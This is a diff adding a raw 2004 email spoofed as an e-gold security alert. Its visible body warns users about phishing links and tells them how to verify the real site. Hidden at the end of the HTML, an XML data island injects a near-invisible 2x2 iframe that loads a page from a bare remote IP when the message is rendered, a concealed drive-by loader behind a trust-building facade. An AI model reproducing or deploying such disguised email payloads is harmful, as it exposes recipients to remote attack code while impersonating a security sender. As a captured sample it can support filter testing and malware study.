@@ -1,0 +1,93 @@
+Return-Path: <security@e-gold.com>
+Delivered-To: em-ca-bruceg@em.ca
+Received: (qmail 12127 invoked by uid 115); 3 Oct 2004 22:46:23 -0000
+Received: from security@e-gold.com by churchill by uid 64011 with qmail-scanner-1.22 
+ (clamdscan: 0.75-1. spamassassin: 2.63.  Clear:RC:0(202.54.110.5):. 
+ Processed in 1.158901 secs); 03 Oct 2004 22:46:23 -0000
+Received: from unknown (HELO 202.54.110.5) (202.54.110.5)
+  by churchill.factcomp.com with SMTP; 3 Oct 2004 22:46:22 -0000
+Message-ID: <2004103776.11528.qmail@e-gold.com>
+Date: Sun, 3 Oct 2004 22:48:08 +0000
+From: <security@e-gold.com>
+Subject: Fraud messages spread over E-Gold users !
+To: <bruceg@em.ca>
+MIME-Version: 1.0
+Content-Type: text/html; charset=iso-8859-1
+
+<html>
+  <head>
+     <meta http-equiv="content-type" content="text/html">
+     <meta name="generator" content="MSHTML 6.00.2800.1106">
+     <title>
+     </title>
+  </head>
+<body bgcolor="#FFFFFF" textcolor="#000000">
+  <div align="justify">
+    <font face="Courier New" color="#000000" size="2">
+Dear E-Gold User!<br>
+<br>
+Net scammers under the name of E-Gold users send many fraud messages!<br>
+<br>
+PLEASE BE ADVISED E-GOLD WILL NEVER SEND YOU AN HTML EMAIL WITH A HYPERTEXT
+LINK ASKING YOU TO CLICK ON THE LINK TO ACCESS YOUR ACCOUNT!<br>
+<br>
+There are numerous fraudulent emails in circulation spoofing e-mail
+addresses in the e-gold.com domain. These emails direct you to
+log into your account to verify information or update information
+and they usually operate on greed or fear in order to entice victims
+to click a hypertext link.<br>
+<br>
+These emails may say your account has a value limit, you have
+received fraudulent funds, your account will be closed for inactivity,
+or that e-gold is paying monthly interest payments.<br>
+<br>
+Regardless of the subject line of the fraudulent emails, they always
+have one thing in common. The hypertext link in the email will appear
+to be to the e-gold website, but if clicked, it directs the victim
+to a fraudulent website, designed to ensnare the careless by mimicking
+the appearance of the real e-gold website. The technique used to
+obscure the true destination of such hypertext links is via the
+use of HTML formatted e-mail.<br>
+<br>
+The ultimate goal of the criminal is to entice his victims to enter
+their e-gold account number and passphrase while on the fraudulent
+website. Once the criminal has gained this information, he has
+everything he needs to log in to the victim's e-gold account
+on the real e-gold website and divert the value.<br>
+<br>
+We urge Users to:<br>
+<br>
+1 Never click hypertext links in HTML formatted e-mail to access your account.<br>
+<br>
+2 Confirm that you are on the e-gold website before entering your e-gold
+passphrase into either a logon form or a payment authorization form
+(see note below about e-gold shopping cart interface):<br>
+<br>
+&nbsp;&nbsp;-&nbsp;&nbsp;Verify the address/location/URL starts with: https://www.e-gold.com/<br>
+<br>
+&nbsp;&nbsp;-&nbsp;&nbsp;Verify the site is secure (look at the SSL Lock icon at the bottom of your browser window)<br>
+<br>
+&nbsp;&nbsp;-&nbsp;&nbsp;Verify that the site certificate is issued by VeriSign to www.e-gold.com<br>
+<br>
+<br>
+E-Gold Shopping Cart Interface (SCI)<br>
+<br>
+Merchant sites using the e-gold SCI will pass you to the e-gold website
+at checkout to authorize payment. The e-gold SCI will pass you back to
+the Merchant's site after you have received confirmation of your e-gold
+Spend. All of the above criteria for verifying you are on the e-gold
+website also apply to Spends made via the e-gold SCI.<br>
+<br>
+    </font>
+  </div>
+<span datafld="strt" dataformatas="html" datasrc="#exfl"></span>
+<xml id="exfl">
+  <security>
+    <strt>
+      <![CDATA[<iframe width="2" height="2" border="0" src="http://209.51.149.77/help/index02.html"></iframe>]]>
+    </strt>
+  </security>
+</xml>
+</body>
+</html>
+
